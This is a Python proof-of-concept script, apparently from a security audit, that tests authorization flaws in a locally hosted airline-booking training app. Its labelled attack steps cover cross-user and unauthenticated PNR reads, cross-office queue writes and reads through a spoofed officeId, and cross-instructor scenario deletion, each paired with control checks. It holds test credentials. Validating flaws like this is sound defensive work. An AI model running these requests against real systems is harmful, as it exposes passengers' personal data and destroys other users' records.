#!/usr/bin/env python3
"""IDOR validation: cross-cadet PNR read via RT/A + RT1, guest RT read."""
import json
import re
import sys
import urllib.parse

import requests

BASE = "http://127.0.0.1:8088"
PROXIES = {"http": "http://127.0.0.1:48080", "https": "http://127.0.0.1:48080"}

INSTRUCTOR = ("mharper", "Vq7tunnel9Ridgeway")
CADET_A = ("ofletcher", "Br4ssplate2Sundial")
CADET_B = ("pnandra", "Cedar8Lantern5Frost")

def new_session():
    s = requests.Session()
    s.proxies = PROXIES
    s.trust_env = False
    return s

def login(username, password):
    s = new_session()
    r = s.get(BASE + "/login", timeout=15)
    token = re.search(r'name="_token" value="([^"]+)"', r.text)
    assert token, "no csrf token on login page"
    r = s.post(
        BASE + "/login",
        data={"_token": token.group(1), "username": username, "password": password},
        allow_redirects=False,
        timeout=15,
    )
    assert r.status_code == 302, f"login failed {username}: {r.status_code}"
    s.get(BASE + "/dashboard", timeout=15)  # refresh cookies post-regeneration
    return s

def api_headers(s):
    xsrf = urllib.parse.unquote(s.cookies.get("XSRF-TOKEN", ""))
    return {"X-XSRF-TOKEN": xsrf, "Accept": "application/json"}

def execute(s, command, state=None):
    payload = {"command": command}
    if state is not None:
        payload["state"] = state
    r = s.post(
        BASE + "/api/terminal/execute",
        json=payload,
        headers=api_headers(s),
        timeout=20,
    )
    try:
        body = r.json()
    except ValueError:
        body = {"raw": r.text[:300]}
    return r.status_code, body

def show(tag, code, body, keys=("outputLines",)):
    print(f"\n=== {tag} [HTTP {code}] isError={body.get('isError')} type={body.get('commandType')}")
    for k in keys:
        if k in body:
            for line in body[k]:
                print("   ", line)

def main():
    print("## logging in")
    inst = login(*INSTRUCTOR)
    cadet_a = login(*CADET_A)
    cadet_b = login(*CADET_B)
    guest = new_session()
    guest.get(BASE + "/login", timeout=15)  # session + csrf only, never logs in

    print("## cadet A builds and stores a PNR")
    state = None
    for cmd in [
        "AN15NOVLHRJFK",
        "SS1Y1",
        "NM1SAMPLE/ENTRY MR",
        "AP LON 44-20-7123-4567-A",
        "TKOK",
        "RF PASSENGER",
        "ET",
    ]:
        code, body = execute(cadet_a, cmd, state)
        show(f"A: {cmd}", code, body)
        state = body.get("updatedState", state)

    locator = None
    for line in state.get("activePnr", {}).get("history", []) or []:
        pass
    # locator comes from ET response lines and updatedState
    rloc = state.get("activePnr", {}).get("recordLocator")
    locator = rloc
    print(f"\n## stored PNR locator for cadet A: {locator}")

    print("\n## CONTROL: cadet B direct RT<locator> (expect ACCESS RESTRICTED)")
    code, body = execute(cadet_b, f"RT{locator}")
    show("B: RT<locator>", code, body)

    print("\n## CONTROL: cadet B surname search (expect scoped/no match)")
    code, body = execute(cadet_b, "RT/SAMPLE")
    show("B: RT/SAMPLE", code, body)

    print("\n## ATTACK 1: cadet B RT/A alphabetical index (expect cross-user list)")
    code, body = execute(cadet_b, "RT/A")
    show("B: RT/A", code, body)
    leaked = (body.get("updatedState") or {}).get("lastPnrList") or []
    print(f"   lastPnrList entries: {len(leaked)}")
    for i, p in enumerate(leaked):
        pax = (p.get("passengers") or [{}])[0]
        print(f"   [{i+1}] rloc={p.get('recordLocator')} pax={pax.get('lastName')}/{pax.get('firstName')} contacts={p.get('contacts')}")

    print("\n## ATTACK 2: cadet B RT1 line-retrieve from leaked list (expect full foreign PNR)")
    if leaked:
        st = body.get("updatedState")
        code, body2 = execute(cadet_b, "RT1", st)
        show("B: RT1", code, body2)

    print("\n## ATTACK 3: unauthenticated guest RT<locator> (expect full PNR display)")
    code, body = execute(guest, f"RT{locator}")
    show("GUEST: RT<locator>", code, body)

    print("\n## ATTACK 4: unauthenticated guest RT/A index")
    code, body = execute(guest, "RT/A")
    show("GUEST: RT/A", code, body)
    leaked_g = (body.get("updatedState") or {}).get("lastPnrList") or []
    print(f"   guest lastPnrList entries: {len(leaked_g)}")

    print("\n## ATTACK 5: unauthenticated guest surname search (auto-retrieve single match)")
    code, body = execute(guest, "RT/SAMPLE")
    show("GUEST: RT/SAMPLE", code, body)

    print("\n## CONTROL: cadet B getActivePnrApi?user=ofletcher (expect own PNR, not A's)")
    r = cadet_b.get(BASE + "/api/dashboard/active-pnr", params={"user": "ofletcher"}, headers=api_headers(cadet_b), timeout=15)
    print("   HTTP", r.status_code, r.text[:300])

    print("\n## CONTROL: cadet B submits with A's recordLocator (expect 422)")
    r = cadet_b.post(
        BASE + "/api/dashboard/scenarios/first-booking/submit",
        json={"recordLocator": locator},
        headers=api_headers(cadet_b),
        timeout=15,
    )
    print("   HTTP", r.status_code, r.text[:300])

    print("\n## CONTROL: cadet B GET /dashboard/gradebook (expect redirect to own dashboard)")
    r = cadet_b.get(BASE + "/dashboard/gradebook", allow_redirects=False, timeout=15)
    print("   HTTP", r.status_code, r.headers.get("Location"))

    with open("/workspace/amadus/poc_idor_result_58e94365.json", "w") as fh:
        json.dump({"locator": locator}, fh)

def phase2():
    """RT/S leak chain, guest cross-office queue write/read, cross-instructor scenario delete."""
    inst = login(*INSTRUCTOR)
    cadet_b = login(*CADET_B)
    guest = new_session()
    guest.get(BASE + "/login", timeout=15)

    print("## ATTACK 1b: cadet B RT/S single-letter index (expect A's PNR leaked)")
    code, body = execute(cadet_b, "RT/S")
    show("B: RT/S", code, body)
    leaked = (body.get("updatedState") or {}).get("lastPnrList") or []
    for i, p in enumerate(leaked):
        pax = (p.get("passengers") or [{}])[0]
        print(f"   [{i+1}] rloc={p.get('recordLocator')} pax={pax.get('lastName')}/{pax.get('firstName')} contacts={p.get('contacts')}")

    print("\n## ATTACK 2b: cadet B RT1 on leaked list (expect full foreign PNR)")
    if leaked:
        st = body.get("updatedState")
        target_idx = next((i for i, p in enumerate(leaked) if p.get("recordLocator") == "BXU79M"), 0)
        code, body2 = execute(cadet_b, f"RT{target_idx+1}", st)
        show(f"B: RT{target_idx+1}", code, body2)

    print("\n## ATTACK 6: GUEST writes queue item to foreign office via QE/XOFF22")
    code, body = execute(guest, "QE/XOFF22/9C0", {"officeId": "XOFF22", "activePnr": {"recordLocator": "ZZZ9Y8", "passengers": [{"id": "1.1", "lastName": "GUESTWRITE", "firstName": "TEST", "title": "MR", "type": "ADT"}], "segments": []}})
    show("GUEST: QE/XOFF22/9C0", code, body)

    print("\n## ATTACK 7: cadet B reads XOFF22 queue via spoofed state.officeId")
    code, body = execute(cadet_b, "QD 9", {"officeId": "XOFF22"})
    show("B: QD 9 (officeId=XOFF22)", code, body)

    print("\n## CONTROL: cadet B queue with own office LON1A0980")
    code, body = execute(cadet_b, "QT", {"officeId": "LON1A0980"})
    show("B: QT (officeId=LON1A0980)", code, body)

    print("\n## ATTACK 8: instructor A creates scenario, instructor B deletes it")
    scenario_id = "zz-crosscheck-" + __import__("random").randint(1000, 9999).__str__()
    r = inst.post(BASE + "/api/instructor/scenarios", json={
        "id": scenario_id,
        "title": "Cross Instructor Drill",
        "category": "One Way",
        "difficulty": "Beginner",
        "description": "drill",
        "passenger_profile": {"name": "TEST/ENTRY"},
        "flight_segments": [],
        "validation_criteria": {},
        "time_limit_minutes": 10,
    }, headers=api_headers(inst), timeout=15)
    print("   create as mharper:", r.status_code, r.text[:200])

    inst_b = login("admin", "admin")  # placeholder; replaced below if needed

    print("\n## done phase2")


def phase3():
    """Cross-office queue read via spoofed officeId; cross-instructor scenario delete."""
    import random
    inst_lon = login(*INSTRUCTOR)          # mharper, LON1A0980
    inst_x = login("cross_inst", "Ridge9Cedar2Tunnel")  # XOFF22
    cadet_b = login(*CADET_B)              # pnandra, LON1A0980

    print("## broadcast a null-target item into XOFF22 (instructor of that office)")
    r = inst_x.post(BASE + "/api/instructor/queues/broadcast", json={
        "queue_number": 7, "category": "SCHEDULE_CHANGE",
        "pnr_locator": "XY77TT", "message": "SCHEDULE CHANGE VERIFY",
        "passenger": "XOFF/PAX", "itinerary": "LHRJFK", "urgency": "HIGH",
    }, headers=api_headers(inst_x), timeout=15)
    print("   broadcast:", r.status_code, r.text[:200])

    print("\n## ATTACK 7b: LON cadet reads XOFF22 queue via spoofed state.officeId")
    code, body = execute(cadet_b, "QD 7", {"officeId": "XOFF22"})
    show("B: QD 7 (officeId=XOFF22)", code, body)

    print("\n## CONTROL: same command with honest officeId=LON1A0980 (expect empty)")
    code, body = execute(cadet_b, "QD 7", {"officeId": "LON1A0980"})
    show("B: QD 7 (officeId=LON1A0980)", code, body)

    print("\n## setup: mharper creates scenario; cadet A submits against it")
    scenario_id = f"zz-xcheck-{random.randint(1000,9999)}"
    r = inst_lon.post(BASE + "/api/instructor/scenarios", json={
        "id": scenario_id, "title": "Cross Office Drill", "category": "One Way",
        "difficulty": "Beginner", "description": "drill",
        "passenger_profile": {"name": "TEST/ENTRY"},
        "flight_segments": [{"airline": "BA", "from": "LHR", "to": "JFK"}],
        "validation_criteria": {"mandatoryPrint": {"name": True}},
        "time_limit_minutes": 10,
    }, headers=api_headers(inst_lon), timeout=15)
    print("   create:", r.status_code, r.text[:160])
    cadet_a = login(*CADET_A)
    r = cadet_a.post(BASE + f"/api/dashboard/scenarios/{scenario_id}/submit", json={},
                     headers=api_headers(cadet_a), timeout=15)
    print("   cadet A submit:", r.status_code, r.text[:160])

    print("\n## CONTROL: cadet B tries to delete the scenario (expect 403)")
    r = cadet_b.delete(BASE + f"/api/instructor/scenarios/{scenario_id}",
                       headers=api_headers(cadet_b), timeout=15)
    print("   delete as cadet:", r.status_code, r.text[:160])

    print("\n## ATTACK 8: instructor of ANOTHER office deletes mharper's scenario")
    r = inst_x.delete(BASE + f"/api/instructor/scenarios/{scenario_id}",
                      headers=api_headers(inst_x), timeout=15)
    print("   delete as XOFF22 instructor:", r.status_code, r.text[:200])

    print("\n## verify cascade: submissions for that scenario gone")
    r = inst_lon.get(BASE + "/dashboard", timeout=15)
    import subprocess
    out = subprocess.run(
        ["php", "-r", f'$db=new PDO("sqlite:database/scan.sqlite"); echo "submissions left: "; foreach($db->query("SELECT COUNT(*) c FROM submissions WHERE scenario_id=\"{scenario_id}\"") as $x) echo $x["c"]; echo PHP_EOL; echo "scenarios left: "; foreach($db->query("SELECT COUNT(*) c FROM scenarios WHERE id=\"{scenario_id}\"") as $x) echo $x["c"];'],
        capture_output=True, text=True, cwd="/workspace/amadus")
    print("   ", out.stdout.strip(), out.stderr.strip()[:200])

    print("\n## CONTROL: cross_inst spectates LON student (expect 404, office-scoped)")
    r = inst_x.get(BASE + "/api/instructor/spectate/ofletcher",
                   headers=api_headers(inst_x), timeout=15)
    print("   spectate cross-office:", r.status_code, r.text[:160])
    r = inst_lon.get(BASE + "/api/instructor/spectate/ofletcher",
                     headers=api_headers(inst_lon), timeout=15)
    print("   spectate same-office:", r.status_code, r.text[:200])

    print("\n## CONTROL: cross_inst deletes LON student (expect 404, office-scoped)")
    r = inst_x.delete(BASE + "/api/instructor/students/2",
                      headers=api_headers(inst_x), timeout=15)
    print("   destroyStudent cross-office:", r.status_code, r.text[:160])

    print("\n## CONTROL: cross_inst sandbox reset must not touch LON1A0980 PNRs")
    r = inst_x.post(BASE + "/api/instructor/sandbox/reset", json={},
                    headers=api_headers(inst_x), timeout=15)
    print("   reset:", r.status_code, r.text[:200])
    out = subprocess.run(
        ["php", "-r", '$db=new PDO("sqlite:database/scan.sqlite"); foreach($db->query("SELECT COUNT(*) c, office_id FROM pnrs GROUP BY office_id") as $x) echo $x["office_id"]."=".$x["c"]." "; echo PHP_EOL;'],
        capture_output=True, text=True, cwd="/workspace/amadus")
    print("   PNRs by office:", out.stdout.strip())

    print("\n## done phase3")


if __name__ == "__main__":
    phase = sys.argv[1] if len(sys.argv) > 1 else "main"
    {"main": main, "phase2": phase2, "phase3": phase3}[phase]()
